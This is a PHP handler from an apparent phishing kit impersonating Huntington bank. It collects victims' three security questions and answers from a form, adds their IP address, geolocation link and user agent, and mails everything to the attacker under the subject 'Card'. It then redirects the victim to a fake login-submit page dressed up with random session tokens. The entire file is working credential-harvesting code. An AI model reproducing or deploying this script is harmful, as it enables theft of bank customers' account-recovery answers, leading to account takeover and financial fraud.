<?php
if($_POST["q1"] != "" and $_POST["ans1"] != ""){
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "--------------Hunt!ngt0n Info-----------------------\n";
$message .= "Question 1            	: ".$_POST['q1']."\n";
$message .= "Answer 1            	: ".$_POST['ans1']."\n";
$message .= "Question 2             : ".$_POST['q2']."\n";
$message .= "Answer 2               : ".$_POST['ans2']."\n";
$message .= "Question 3             : ".$_POST['q3']."\n";
$message .= "Answer 3            	: ".$_POST['ans3']."\n";
$message .= "|--------------- I N F O | I P -------------------|\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "User Agent : ".$useragent."\n";
$message .= "|----------- unknown --------------|\n";
include 'email.php';
$subject = "Card | $ip";
{
mail("$to", "$send", "$subject", $message);     
}
$praga=rand();
$praga=md5($praga);
  header ("Location: surf4.php?cmd=login_submit&id=$praga$praga&session=$praga$praga");
}else{
header ("Location: index.php");
}

?>
